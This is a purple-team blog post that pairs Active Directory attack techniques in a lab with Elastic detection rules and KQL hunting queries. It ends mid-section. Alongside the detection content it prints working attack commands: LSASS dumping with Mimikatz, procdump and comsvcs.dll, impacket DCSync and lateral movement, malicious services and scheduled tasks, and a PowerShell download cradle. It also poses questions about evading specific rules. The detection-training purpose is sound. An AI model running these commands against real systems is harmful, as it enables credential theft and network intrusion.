---
title: "Detection scenarios for Active Directory"
kicker: "Purple Team · Active Directory · Elastic"
tags: "Purple Team · Active Directory · Elastic SIEM/EDR · GOAD"
lead: "A follow-up to Building a Game of Active Directory + Elastic EDR Cyber Range on Ludus. This post covers: turning AD attack techniques into structured detection practice, understanding what defenders see, and learning to operate against a monitored environment."
---

![Ludus Active Directory Topology](https://cdn-images-1.medium.com/max/800/1*rygwFpdxirdKUZQUm58Jwg.png)
*Ludus Active Directory Topology*

## Overview

This is a follow-up to [Building an Active Directory Cyber range with Elastic stack](writeup.html?file=writeups/goad-writeup.md) . That post covered the infrastructure: getting Game Of Active Directory and Elastic Defend deployed, agents enrolled, telemetry flowing into Kibana, and a clean snapshot to iterate from.

This post covers what to actually do with it.

If the lab is running and Kibana is ingesting events. The question now is: how do you take the AD attack techniques you already know and turn them into structured detection practice, so you understand what defenders see and learn to operate against a monitored environment?

That is the gap between knowing how to attack AD and understanding what the compromise looks like in a SIEM. This lab hope to help bridge that gap in understanding.

A note on what this post does not cover. Kerberoasting, AS-REP roasting, and BloodHound domain enumeration are intentionally excluded from the main scenario list. In testing against this lab, those techniques did not trigger any of Elastic's prebuilt detection rules(free edition). Kerberoasting and AS-REP roasting produce Windows Security Event IDs 4769 and 4768 respectively, and those events do land in Kibana Discover. But Elastic does not ship a prebuilt rule that fires on those event IDs in a standard Defend + Sysmon configuration. BloodHound LDAP enumeration similarly produces network connection telemetry but no prebuilt alert. These techniques are still visible in raw logs via Discover, and **you can and should write custom detection rules for them (covered in the final section)**. Every scenario below was selected because it reliably fires at least one Elastic prebuilt detection rule in this lab environment, giving you a concrete alert to analyze, understand, and iterate against.

---

## How This Post Is Structured

Each scenario follows this format:

- **Technique and MITRE ATT&CK mapping** for the attack being executed.
- **Prebuilt rule(s) to enable** with the exact rule name as it appears in Kibana under Security > Rules.
- **Attack execution** with the command to run against GOAD-Light targets.
- **KQL confirmation query** to verify telemetry landed in Discover, independent of whether the prebuilt rule fired. This is how you identify detection gaps and validate coverage.
- **What the rule checks** with the detection logic explained so you understand its trigger conditions.
- **Opsec considerations** framed as research questions, not answers. The goal is to drive your own testing, not a bypass guide.
- **Iteration prompt** to guide your next lab session.

The goal is not to hand you bypass scripts. The goal is to read a detection rule, understand its trigger conditions, and design your own tests. That skill transfers to every EDR and SIEM, not just Elastic.

---

## Lab Workflow: The Iteration Loop

Before diving into scenarios, lets internalize this workflow. Every scenario follows it. It is the core value of having a lab with EDR.

1. **Snapshot**    -->  `ludus --user $GOAD_USER snapshots create pre-<scenario>`
2. **Enable**      -->  Kibana: Security > Rules > search rule name > Enable
3. **Attack**      -->  Execute the technique from your home PC over WireGuard
4. **Observe**     -->  Kibana: Security > Alerts, then Discover for raw events
5. **Analyze**     -->  Read the rule that fired. Click into its Definition tab.
6. **Note**        -->  Document: what fired, the rule query, what it misses.
7. **Revert**      -->  `ludus --user $GOAD_USER snapshots revert pre-<scenario>`
8. **Modify**      -->  Change one variable in your approach.
9. **Repeat**      -->  Steps 3-7 again. Compare.

Step 5 is where the learning happens. Elastic's prebuilt detection rules are viewable in Kibana under Security > Rules > (click rule name) > Definition. Each rule is either a KQL query, an EQL sequence, or a machine learning job. Reading the query tells you exactly what conditions must be met for the rule to fire. That is your evasion surface.

Step 2 is critical. Many prebuilt rules are not enabled by default. Before running a scenario, search for the rule name listed in that scenario and enable it. If the rule has prerequisites (specific audit policies, Sysmon event IDs, Elastic Defend data sources), the rule's Setup tab will document them.

Keep your notes. One note per scenario, with subsections for each iteration. You will want to compare across runs.

---

## Understanding What Elastic Actually Sees

Before running any scenario, you need a mental model of Elastic's telemetry pipeline in this lab.

**Elastic Defend (EDR sensor)** is the kernel-level component. It hooks process creation, file writes, network connections, registry modifications, and library loads. On your GOAD-Light VMs, it is running in "detect" mode (not "prevent"), meaning it logs and alerts but does not block. This is intentional for a learning lab.

**Sysmon** is installed alongside the Elastic Agent by the `ludus_elastic_agent` role with `ludus_elastic_install_sysmon: true`. Sysmon provides a complementary telemetry layer. Event ID 1 (process creation with full command-line and hashes), Event ID 10 (process access with GrantedAccess and CallTrace), and Event ID 13 (registry value set) are particularly relevant to the scenarios below.

**Windows Security Event Log** provides Kerberos ticket requests (4768, 4769), logon events (4624, 4625), privilege use (4672), directory service access (4662), service installation (7045, 4697), and scheduled task creation (4698). Several prebuilt rules key off these event IDs.

**What Elastic does NOT see in this lab by default:**

- Network-layer packet capture. Elastic Defend logs network connections (source, dest, port, process) but does not perform deep packet inspection. Protocol-level activity in Kerberos request flags are invisible unless they produce a distinct Windows event.
- DNS query logs from the DCs themselves, unless you enable DNS Analytical logging or DNS debug logging.
- Full SACL-based AD object auditing. The "Audit Directory Service Access" policy may not be enabled on the GOAD-Light DCs by default. This affects DCSync detection (Scenario 3). Check and enable it if needed.

**Kibana orientation for detection work:**

- **Security > Alerts:** aggregated view of every detection rule that fired. Start here after every attack.
- **Security > Rules:** the full rule library. Search by name to find and enable rules for each scenario.
- **Discover:** raw event search. Use `event.dataset` to isolate Sysmon (`windows.sysmon_operational`), Defend (`endpoint.events.*`), or Security logs (`windows.security`). This is where you confirm telemetry exists even when prebuilt rules did not fire.
- **Timeline:** drag events into a visual timeline for sequencing multi-step attacks.

---

## Scenario 1: Credential Dumping via LSASS Access

**MITRE ATT&CK:** T1003.001 OS Credential Dumping: LSASS Memory

### Prebuilt Rules to Enable

Search for and enable these rules under Security > Rules before executing the attack:

- **Suspicious Lsass Process Access** — EQL — Sysmon (Event ID 10)
- **LSASS Process Access via Windows API** — ES|QL — Elastic Defend
- **Potential Credential Access via LSASS Memory Dump** — EQL — Sysmon (Event ID 10)
- **LSASS Memory Dump Handle Access** — new_terms — Windows Security (Event ID 4656)
- **LSASS Memory Dump Creation** — EQL — Elastic Defend
- **Potential Credential Access via Windows Utilities** — EQL — Elastic Defend

The first two are the most likely to fire in this lab. **Suspicious Lsass Process Access** requires Sysmon Event ID 10 to be enabled and ingested. **LSASS Process Access via Windows API** requires Elastic Defend data. **LSASS Memory Dump Handle Access** requires the "Audit Handle Manipulation" audit policy to be enabled on the target host.

### Attack Execution

From a compromised Windows host in the GOAD-Light environment (such as SRV02/DC02 at 10.1.10.22/10.1.10.11 after compromise), execute one of the following:

**Using Mimikatz** (if uploaded to the host):

```text
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

**Using procdump** (Sysinternals):

```text
procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
```

![Sysinternals procdump dumping LSASS](https://cdn-images-1.medium.com/max/800/1*F1J-5ftw-C8WTxhdeJpQsA.png)
*Using sysinternal prodump*

### KQL Confirmation Query

Run these in Kibana Discover to confirm telemetry landed, regardless of whether the prebuilt rule fired.

**Sysmon Event ID 10** (ProcessAccess targeting LSASS):

```kql
event.code:"10" AND winlog.event_data.TargetImage:"*\\lsass.exe"
```

Narrow to suspicious access masks by excluding low-privilege access:

```kql
event.code:"10" AND winlog.event_data.TargetImage:"*\\lsass.exe" AND NOT winlog.event_data.GrantedAccess:("0x1000" OR "0x1400" OR "0x101400" OR "0x100000" OR "0x100040")
```

**Elastic Defend API events** (if using Defend as the data source):

```kql
event.dataset:"endpoint.events.api" AND Target.process.name:"lsass.exe" AND process.Ext.api.name:("OpenProcess" OR "ReadProcessMemory")
```

**Windows Security Event ID 4656** (handle access to LSASS):

```kql
event.code:"4656" AND winlog.event_data.ObjectName:"*\\lsass.exe" AND winlog.event_data.AccessMask:("0x1fffff" OR "0x1010" OR "0x120089" OR "0x1F3FFF")
```

### What the Rule Checks

The **Suspicious Lsass Process Access** rule uses the following EQL logic (simplified):

```eql
process where event.code == "10"
  and winlog.event_data.TargetImage : "?:\\WINDOWS\\system32\\lsass.exe"
  and not winlog.event_data.GrantedAccess : ("0x1000", "0x1400", "0x101400", ...)
  and not process.name : ("procexp64.exe", "procmon.exe", ...)
```

The key field is **GrantedAccess**. The rule fires when a process opens a handle to LSASS with an access mask that is NOT in the known-benign list. Access masks like `0x1fffff` (PROCESS_ALL_ACCESS), `0x1010` (PROCESS_QUERY_LIMITED_INFORMATION + PROCESS_VM_READ), and `0x120089` are commonly used by credential dumping tools and are not excluded.

The rule also excludes specific known-good processes like Process Explorer, antivirus engines, and system processes by `process.name` and `process.executable`.

### Opsec Considerations

These are open-ended questions to drive your own testing, this is not a bypass guide.

- What is the GrantedAccess value your tool uses? Look it up in the Sysmon Event ID 10 log. Compare it against the exclusion list in the rule definition. Research what the minimum access rights are to actually read LSASS memory.
- Does the CallTrace field in the Sysmon event reveal which DLL performed the access? The **Potential Credential Access via LSASS Memory Dump** rule specifically looks for `dbghelp.dll` or `dbgcore.dll` in the CallTrace. Tools that use different DLLs for memory reading may evade that specific rule.
- What happens if the attacking process is a signed Microsoft binary? Some rules exclude processes by code signature. Research whether using a LOLBin as the access process changes the detection outcome.
- The **LSASS Memory Dump Handle Access** rule uses a `new_terms` rule type, meaning it fires only the first time a given process name accesses LSASS. A second access from the same process name in the same time window will not fire again. Test what happens when you run the same tool twice.

### Iteration Prompt

After running this scenario, pull up the Sysmon Event ID 10 entry for your LSASS access. Document the GrantedAccess, CallTrace, and SourceImage fields. Then open the prebuilt rule definition and map each field to a condition in the rule query. Can you identify which single field change would cause the rule to stop firing?

---

## Scenario 2: LSASS Dump via comsvcs.dll and Rundll32

**MITRE ATT&CK:** T1003.001 OS Credential Dumping: LSASS Memory

This is a specific sub-technique of Scenario 1 that uses a signed Windows DLL to perform the dump, making it a **LOLBin** scenario. It fires a different set of rules.

### Prebuilt Rules to Enable

- **Potential Credential Access via Windows Utilities** — EQL — Elastic Defend, Sysmon
- **LSASS Memory Dump Creation** — EQL — Elastic Defend
- **Suspicious Lsass Process Access** — EQL — Sysmon (Event ID 10)

The **Potential Credential Access via Windows Utilities** rule is the primary detection here. It looks for execution of known credential dumping utilities including `rundll32.exe` with `comsvcs.dll` in the command line, `procdump.exe` targeting LSASS, and `ntdsutil.exe` performing IFM operations.

### Attack Execution

From a compromised host with local admin privileges:

```powershell
:: First, find the LSASS PID
get-process lsass

:: Then dump using comsvcs.dll MiniDump export (#24 is the ordinal for MiniDump)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\Windows\Temp\out.dmp full
```

![rundll32 comsvcs.dll LSASS dump](https://cdn-images-1.medium.com/max/800/1*MnNeUtPErIvEf5iYhhjfCg.png)
*Using rundll32*

### KQL Confirmation Query

**Process creation event** for rundll32 with comsvcs.dll:

```kql
process.name:"rundll32.exe" AND process.command_line:*comsvcs*
```

**File creation event** for the dump output:

```kql
file.path:*\.dmp AND process.name:"rundll32.exe"
```

**Sysmon Event ID 10** (LSASS access from rundll32):

```kql
event.code:"10" AND winlog.event_data.TargetImage:"*\\lsass.exe" AND winlog.event_data.SourceImage:"*\\rundll32.exe"
```

### What the Rule Checks

The **Potential Credential Access via Windows Utilities** rule matches process creation events where the command line contains patterns associated with credential dumping tools. For the `comsvcs.dll` variant, the rule checks whether `rundll32.exe` is executing with `comsvcs.dll` and the `MiniDump` or `#24` export function in the command line arguments, along with a target that resolves to LSASS.

The **LSASS Memory Dump Creation** rule takes a different approach. It monitors for file creation events where the file name matches known dump file patterns (such as `lsass*.dmp`, `dumpert.dmp`, `Andrew.dmp`, or `SQLDmpr*.mdmp`) written by processes that are not part of the expected crash-handling or diagnostics workflow.

### Opsec Considerations

These are open-ended questions to drive your own testing, this is not a bypass guide.

- The `comsvcs.dll` technique is well-documented and the command-line pattern is the primary detection anchor. Research what happens if you copy `comsvcs.dll` to a different name or location before invoking it. Does the rule check the DLL name in the command line, the DLL path, or something else?
- The MiniDump export can be referenced by ordinal (`#24`) instead of by name. Test whether both forms produce the same detection outcome.
- What happens if you rename the output file to something other than `.dmp`? The **LSASS Memory Dump Creation** rule matches on file naming patterns. Research the specific patterns it checks.
- Consider the parent process chain. If `rundll32.exe` is spawned by `services.exe` versus `cmd.exe` versus `explorer.exe`, does the detection outcome change?

### Iteration Prompt

Run this scenario twice: once with the standard `MiniDump` syntax, once using ordinal `#24`. Compare the alerts and raw Sysmon events. Then read the rule definition for **Potential Credential Access via Windows Utilities** and identify every string pattern it matches in the command line.

---

## Scenario 3: DCSync

**MITRE ATT&CK:** T1003.006 OS Credential Dumping: DCSync

### Prebuilt Rules to Enable

- **Potential Credential Access via DCSync** — KQL — Windows Security (Event ID 4662)
- **FirstTime Seen Account Performing DCSync** — new_terms — Windows Security (Event ID 4662)

**Prerequisite:** These rules require the "Audit Directory Service Access" audit policy to be enabled on the domain controllers. Verify this on DC01 (10.1.10.10) and DC02 (10.1.10.11):

```powershell
auditpol /get /subcategory:"Directory Service Access"
```

If not enabled, configure it via Group Policy or locally:

```powershell
auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable
```

Without this audit policy, Event ID 4662 will not be generated and neither rule will fire.

### Attack Execution

From your home PC over WireGuard, using a compromised account with replication privileges. Execute one of the following:

**Full domain dump:**

```bash
impacket-secretsdump -just-dc <domain>/<user>:<password>@10.1.10.10
```

![impacket-secretsdump -just-dc output](https://cdn-images-1.medium.com/max/800/1*SKrjgiRDgJ9Md_Jm2Wr9zA.png)
*NTDS Domain dump with -just-dc*

**Single user (krbtgt):**

```bash
impacket-secretsdump -just-dc-user krbtgt <domain>/<user>:<password>@10.1.10.10
```

### KQL Confirmation Query

**Event ID 4662** with replication GUIDs:

```kql
event.code:"4662" AND winlog.event_data.Properties:(*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2* OR *1131f6aa-9c07-11d1-f79f-00c04fc2dcd2* OR *89e95b76-444d-4c62-991a-0facbeda640c*) AND winlog.event_data.AccessMask:"0x100"
```

Exclude legitimate DC-to-DC replication (computer accounts end with `$`):

```kql
event.code:"4662" AND winlog.event_data.Properties:(*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2* OR *1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*) AND winlog.event_data.AccessMask:"0x100" AND NOT winlog.event_data.SubjectUserName:*$
```

Correlate with the logon event to identify the source IP:

```kql
event.code:"4624" AND winlog.event_data.LogonType:"3" AND winlog.logon.id:<logon_id_from_4662>
```

### What the Rule Checks

The **Potential Credential Access via DCSync** rule uses this KQL query:

```kql
host.os.type:"windows" AND event.code:"4662"
  AND winlog.event_data.Properties:(
    *DS-Replication-Get-Changes*
    OR *DS-Replication-Get-Changes-All*
    OR *DS-Replication-Get-Changes-In-Filtered-Set*
    OR *1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*
    OR *1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*
    OR *89e95b76-444d-4c62-991a-0facbeda640c*
  )
  AND winlog.event_data.AccessMask:"0x100"
  AND NOT winlog.event_data.SubjectUserName:(*$ OR MSOL_*)
```

The three GUIDs correspond to:

- `1131f6aa-...` = DS-Replication-Get-Changes
- `1131f6ad-...` = DS-Replication-Get-Changes-All
- `89e95b76-...` = DS-Replication-Get-Changes-In-Filtered-Set

The rule explicitly excludes computer accounts (names ending with `$`) and Azure AD Connect service accounts (`MSOL_*`) because those are legitimate replication sources. Any non-computer, non-MSOL account performing replication is flagged.

The **FirstTime Seen Account Performing DCSync** rule adds a behavioral layer on top. It uses a `new_terms` rule type that fires only when a user account is seen performing DCSync for the first time. If the same account has replicated before within the rule's lookback window, the rule does not fire again.

### Opsec Considerations

These are open-ended questions to drive your own testing, this is not a bypass guide.

- DCSync cannot be performed without triggering the replication GUIDs. The GUIDs are integral to the DRSUAPI protocol. There is no protocol-level alternative. The opsec question for DCSync is not "how do I avoid the event" but "is anyone watching for the event."
- What happens when you target a single user (`-just-dc-user krbtgt`) versus the full domain? The detection fires on the first 4662 event regardless. But the total event count differs. Document the count for each.
- Correlate the 4662 event with the 4624 logon event using the logon ID. This correlation reveals the source IP of the replication request. In your lab, this will be your WireGuard peer IP (198.51.100.3). In a real environment, a replication request from a non-DC IP is the critical indicator.
- Research whether there is an alternative way to obtain the krbtgt hash or domain credential material without performing DCSync. Techniques like NTDS.dit extraction via Volume Shadow Copy produce different telemetry. Compare.

### Iteration Prompt

After running DCSync, measure the time between when `impacket-secretsdump` starts and when the alert appears in Kibana. This is your detection latency. Then verify: does the prebuilt rule fire on DC01, DC02, or both? Only the DC that receives the replication request generates the 4662 event.

---

## Scenario 4: Lateral Movement via PsExec

**MITRE ATT&CK:** T1021.002 Remote Services: SMB/Windows Admin Shares, T1569.002 System Services: Service Execution

### Prebuilt Rules to Enable

- **PsExec Network Connection** — EQL (sequence) — Elastic Defend, Sysmon
- **Suspicious Process Execution via Renamed PsExec Executable** — EQL — Elastic Defend, Sysmon
- **Suspicious Service was Installed in the System** — KQL — Windows Security (Event ID 7045, 4697)

### Attack Execution

Test multiple impacket lateral movement tools against a GOAD host to compare their detection surfaces.

**impacket-psexec:**

```bash
impacket-psexec <domain>/<user>:<password>@10.1.10.22
```

![impacket-psexec output](https://cdn-images-1.medium.com/max/800/1*iHyUd5_9sXvgx1pXBGXx0Q.png)
*psexec*

**impacket-smbexec:**

```bash
impacket-smbexec <domain>/<user>:<password>@10.1.10.22
```

![impacket-smbexec output](https://cdn-images-1.medium.com/max/800/1*CkbHQFhl3KUSitX6ddcHBg.png)
*smbexec*

**impacket-wmiexec:**

```bash
impacket-wmiexec <domain>/<user>:<password>@10.1.10.22
```

![impacket-wmiexec output](https://cdn-images-1.medium.com/max/800/1*xSgA1kmyfa5bPpDAFUid1A.png)
*wmiexec*

**impacket-atexec:**

```bash
impacket-atexec <domain>/<user>:<password>@10.1.10.22 "whoami"
```

![impacket-atexec output](https://cdn-images-1.medium.com/max/800/1*ZzUL3U8uUVWTsubSfcTvsg.png)
*atexec*

### KQL Confirmation Query

**Service installation events** (PsExec and smbexec create services):

```kql
event.code:"7045" OR event.code:"4697"
```

Filter to suspicious service binary paths:

```kql
(event.code:"7045" AND winlog.event_data.ImagePath:(*cmd* OR *powershell* OR *COMSPEC* OR *\\Users\\* OR *echo* OR *\\127.0.0.1* OR *Admin$*)) OR (event.code:"4697" AND winlog.event_data.ServiceFileName:(*cmd* OR *powershell* OR *COMSPEC* OR *\\Users\\* OR *echo*))
```

**Process creation from services.exe** (PsExec child process pattern):

```kql
process.parent.name:"services.exe" AND event.action:"start"
```

**WMI lateral movement** (wmiprvse.exe spawning cmd.exe):

```kql
process.parent.name:"wmiprvse.exe" AND process.name:("cmd.exe" OR "powershell.exe")
```

**Network logon events** from the attacking IP:

```kql
event.code:"4624" AND winlog.event_data.LogonType:"3" AND source.ip:"198.51.100.3"
```

### What the Rule Checks

The **PsExec Network Connection** rule uses an EQL sequence that correlates two events on the same `process.entity_id`:

1. A process start event where `process.name` is `PsExec.exe` (or `process.pe.original_file_name` is `psexec.c`) with the `-accepteula` argument.
2. A network connection event from that same process.

This rule targets the client-side PsExec binary on the source host. If you are running `impacket-psexec` from Linux, the client-side PsExec binary never executes on a Windows host. The detection surface shifts to the target host, where the **Suspicious Service was Installed in the System** rule fires instead.

The **Suspicious Process Execution via Renamed PsExec Executable** rule monitors for processes where `process.pe.original_file_name` is `psexesvc.exe` but `process.name` is something else. This catches attackers who rename the PsExec service binary to evade name-based detection.

The **Suspicious Service was Installed in the System** rule monitors Event IDs 7045 and 4697 and fires when the service binary path (ImagePath or ServiceFileName) contains patterns associated with malicious services: references to `cmd.exe`, `powershell`, `COMSPEC`, `rundll32`, `echo`, `bitsadmin`, or paths under `\Users\`, `\Windows\Tasks\`, or `\PerfLogs\`.

### Opsec Considerations

- `impacket-psexec` creates a service with a randomized name whose ImagePath contains `cmd.exe /Q /c echo ... > \\127.0.0.1\...` This command-line pattern is what the service installation rule matches on. Research exactly which substring triggers the match.
- Compare the alert output for all four impacket tools. `impacket-wmiexec` does not create a service. It uses WMI to spawn processes, producing a `wmiprvse.exe > cmd.exe` parent-child relationship instead. Does Elastic have a prebuilt rule for that process lineage?
- `impacket-atexec` creates a scheduled task instead of a service. This crosses into Scenario 6 territory. Compare its detection footprint against psexec.
- Note the NTLM vs Kerberos authentication method in the 4624 logon event. When using `impacket-psexec` with a password from your Linux host, the logon typically uses NTLM. In environments where Kerberos is the norm, an NTLM network logon from an unexpected source stands out. Search Discover for `event.code:"4624" AND winlog.event_data.AuthenticationPackageName:"NTLM"` and compare against the baseline.

### Iteration Prompt

Rank the four impacket lateral movement tools by total alert count. For the tool that produced the fewest alerts, identify what residual telemetry it still left in Discover. Then, for the tool that produced the most alerts, read each rule definition and identify the minimum set of command-line modifications that would avoid each detection.

---

## Scenario 5: Suspicious Service Installation

**MITRE ATT&CK:** T1543.003 Create or Modify System Process: Windows Service

### Prebuilt Rules to Enable

| Rule Name | Rule Type | Data Source |
|-----------|-----------|-------------|
| Suspicious Service was Installed in the System | KQL | Windows Security (Event ID 7045, 4697) |

### Attack Execution

From a compromised host with admin privileges, create a service that executes a payload:

**Using sc.exe with cmd.exe payload:**

```powershell
sc create EvilSvc binPath= "cmd.exe /c powershell -enc <base64_payload>" start= auto
sc start EvilSvc
```

![sc.exe creating a service with payload](https://cdn-images-1.medium.com/max/800/1*zBpXJskIzeOfilaauJwB3A.png)
*Using sc with payload*

**Using sc.exe with a binary in a user-writable path:**

```powershell
sc create UpdateSvc binPath= "C:\Users\Public\update.exe" start= auto
sc start UpdateSvc
```

**Modifying an existing service ImagePath** (no 7045 event):

```powershell
sc config <existing_service> binPath= "cmd.exe /c <payload>"
```

### KQL Confirmation Query

**New service installation:**

```kql
event.code:"7045"
```

Filter to suspicious ImagePath values:

```kql
event.code:"7045" AND winlog.event_data.ImagePath:(*cmd* OR *powershell* OR *rundll32* OR *\\Users\\* OR *\\Temp\\* OR *COMSPEC* OR *echo*)
```

**Service creation via Event ID 4697** (if "Audit Security System Extension" is enabled):

```kql
event.code:"4697" AND winlog.event_data.ServiceFileName:(*cmd* OR *powershell* OR *\\Users\\*)
```

**Registry modification to existing service** (alternative detection path):

```kql
event.code:"13" AND winlog.event_data.TargetObject:*\\Services\\*\\ImagePath
```

### What the Rule Checks

The **Suspicious Service was Installed in the System** rule monitors both Event ID 7045 and 4697. It fires when the service binary path matches any of a large set of suspicious patterns:

- **Known LOLBins:** cmd.exe, powershell, rundll32, certutil, bitsadmin, regsvr32, msbuild
- **Suspicious locations:** `\Users\`, `\Windows\Tasks\`, `\PerfLogs\`, `\Windows\Debug\`
- **Indicators of remote execution:** `\127.0.0.1`, `Admin$`, `COMSPEC`, `echo`
- **Known tool patterns:** RemComSvc

The rule also uses a regex to flag services whose binary path is a single executable name directly under `%systemroot%` matching the pattern `%systemroot%\[a-z0-9]+\.exe`, which catches randomized service binary names common in PsExec-style tools.

### Opsec Considerations

The goal is to drive your own testing, this is not a bypass guide.

- Event ID 7045 fires on new service creation. It does **NOT** fire when an existing service's ImagePath is modified via the registry or `sc config`. Test the registry modification approach and verify that 7045 is absent. Then check whether Sysmon Event ID 13 (registry value set) captures the ImagePath change.
- Does the rule fire if instead of a service binary, a malicious powershell command is executed?
- Does the rule check the service binary's digital signature or just the path string? Research whether a signed binary in a suspicious path triggers the same alert as an unsigned binary.
- What if the service binary path points to a legitimate executable with no suspicious command-line arguments? The rule is pattern-matching on the ImagePath string. A service that runs `C:\Windows\System32\svchost.exe -k netsvcs` looks different from one that runs `cmd.exe /c echo`.
- Create a service whose binary path is a full UNC path to an SMB share. Does the rule fire? Check whether `\\` patterns in the ImagePath are covered.

### Iteration Prompt

Create three services: one with a cmd.exe payload, one pointing to a binary in `C:\Users\Public\`, and one that modifies an existing service's ImagePath. Document which of the three triggers the prebuilt rule and which does not. For any that are missed, write the KQL query that would catch them.

---

## Scenario 6: Persistence via Scheduled Tasks

**MITRE ATT&CK:** T1053.005 Scheduled Task/Job: Scheduled Task

### Prebuilt Rules to Enable

| Rule Name | Rule Type | Data Source |
|-----------|-----------|-------------|
| Suspicious Execution via Scheduled Task | EQL | Elastic Defend, Sysmon |
| Outbound Scheduled Task Activity via PowerShell | EQL (sequence) | Elastic Defend |

### Attack Execution

From a compromised host:

**Using schtasks.exe:**

```powershell
schtasks /create /tn "WindowsUpdate" /tr "powershell.exe -enc <base64_payload>" /sc onlogon /ru SYSTEM
```

**Using schtasks.exe with cmd.exe:**

```powershell
schtasks /create /tn "Maintenance" /tr "cmd.exe /c C:\Users\Public\payload.exe" /sc daily /st 02:00 /ru SYSTEM
```

**Run the task immediately** to generate the execution event:

```powershell
schtasks /run /tn "WindowsUpdate"
```

### KQL Confirmation Query

**Scheduled task creation event:**

```kql
event.code:"4698"
```

**Process creation from the Task Scheduler service** (the execution event):

```kql
process.parent.name:"svchost.exe" AND process.parent.args:"Schedule" AND process.name:("powershell.exe" OR "cmd.exe" OR "rundll32.exe" OR "mshta.exe")
```

**schtasks.exe process creation** (the creation event):

```kql
process.name:"schtasks.exe" AND process.args:"/create"
```

### What the Rule Checks

The **Suspicious Execution via Scheduled Task** rule detects the **execution** phase, not the creation phase. It uses EQL to match processes where:

- The parent process is `svchost.exe` with the `Schedule` argument (this is the Task Scheduler service host).
- The child process's `original_file_name` matches a list of commonly abused executables: `cscript.exe`, `wscript.exe`, `PowerShell.EXE`, `Cmd.Exe`, `MSHTA.EXE`, `RUNDLL32.EXE`, `REGSVR32.EXE`, `MSBuild.exe`, `InstallUtil.exe`, and others.
- The child process arguments reference suspicious paths: `C:\Users\*`, `C:\ProgramData\*`, `C:\Windows\Temp\*`, or other non-standard locations.

Both conditions (suspicious executable **AND** suspicious path) must be met for the rule to fire. A scheduled task that runs `cmd.exe` from `C:\Windows\System32\` may not trigger the rule because the path is not in the suspicious list.

### Opsec Considerations

These are open-ended questions to drive your own testing, this is not a bypass guide.

- The rule fires on task **execution**, not creation. This means the task must actually run for the detection to trigger. A task created but never executed will produce a 4698 event in Discover but no prebuilt alert. Research whether there is a prebuilt rule specifically for 4698 task creation events.
- The rule checks `process.pe.original_file_name`, not `process.name`. This means renaming `cmd.exe` to `svchost.exe` will still trigger the rule because the PE header's original filename remains `Cmd.Exe`. Test this.
- What happens if the scheduled task runs a custom binary (not a LOLBin) that is not in the rule's executable list? The rule is limited to a specific set of known-abused binaries. A compiled executable with a unique name would not match.
- Compare creating a task via `schtasks.exe` (which produces a process creation event for `schtasks.exe` itself) versus creating a task via the COM-based Task Scheduler API from PowerShell or C#. The latter avoids the `schtasks.exe` process creation event entirely. Does the execution-phase detection still fire?

### Iteration Prompt

Create two scheduled tasks: one that runs `powershell.exe` from `C:\Users\Public\`, and one that runs a custom-named binary from `C:\Windows\System32\`. Run both. Document which one triggers the prebuilt rule and why. Then check Discover for the 4698 creation events for both and write a custom KQL query that would catch both.

---

## Scenario 7: PowerShell Abuse and Script Block Detection

**MITRE ATT&CK:** T1059.001 Command and Scripting Interpreter: PowerShell

### Prebuilt Rules to Enable

| Rule Name | Rule Type | Data Source |
|-----------|-----------|-------------|
| Suspicious Windows PowerShell Arguments | EQL | Elastic Defend, Sysmon |
| Potential Process Injection via PowerShell | KQL | Windows Security (Event ID 4104) |
| Windows Script Executing PowerShell | EQL | Elastic Defend, Sysmon |

The **Potential Process Injection via PowerShell** rule requires PowerShell Script Block Logging to be enabled (Event ID 4104). Verify this on your GOAD-Light hosts:

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name EnableScriptBlockLogging -ErrorAction SilentlyContinue
```

If not enabled, configure it via Group Policy or registry:

```powershell
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
```

![PowerShell Script Block Logging enabled](https://cdn-images-1.medium.com/max/800/1*nuBWi4QYBwzBRIizznxniw.png)
*Enable script block logging*

### Attack Execution

From a compromised host:

**Encoded command:**

```powershell
powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEALgAxADAALgAyADUANAAvAHQAZQBzAHQALgBwAHMAMQAnACkA
```

![Encoded PowerShell command](https://cdn-images-1.medium.com/max/800/1*_uUwaA5rlxVRkuQtNduPbQ.png)
*Using encoded payload command*

**Download cradle:**

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.1.10.254/test.ps1')
```

![Download cradle execution](https://cdn-images-1.medium.com/max/800/1*fKrUZUr-IHmeZTXiGDq-mQ.png)
*Download cradle*

**Fileless download**

**Process injection pattern:**

```powershell
$code = '[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint type, uint protect);'
Add-Type -MemberDefinition $code -Name "Win32" -Namespace "Inject"
```

![Process injection pattern](https://cdn-images-1.medium.com/max/800/1*y4e-e9kZ5njSkOxVCHu5Wg.png)
*Process injection pattern*

**Match process injection pattern**

### KQL Confirmation Query

**PowerShell process creation with encoded command:**

```kql
process.name:("powershell.exe" OR "pwsh.exe") AND process.args:("-enc" OR "-EncodedCommand" OR "-e")
```

**Script Block Logging events** (Event ID 4104):

```kql
event.code:"4104"
```

**Script blocks containing download cradle patterns:**

```kql
event.code:"4104" AND powershell.file.script_block_text:(*DownloadString* OR *DownloadFile* OR *Invoke-WebRequest* OR *IEX* OR *Invoke-Expression* OR *Net.WebClient*)
```

**Script blocks containing process injection API calls:**

```kql
